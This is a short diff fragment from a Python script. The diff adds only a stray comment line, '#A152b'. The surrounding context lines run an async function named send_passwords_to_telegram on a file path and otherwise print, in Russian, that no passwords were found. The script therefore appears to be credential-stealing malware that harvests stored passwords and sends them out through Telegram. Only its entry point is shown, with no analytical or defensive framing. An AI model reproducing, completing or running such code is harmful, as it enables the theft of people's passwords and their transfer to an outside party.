@@ -80,3 +80,4 @@ if __name__ == "__main__":
         asyncio.run(send_passwords_to_telegram(file_path))
     else:
         print("Пароли не найдены.")
+#A152b
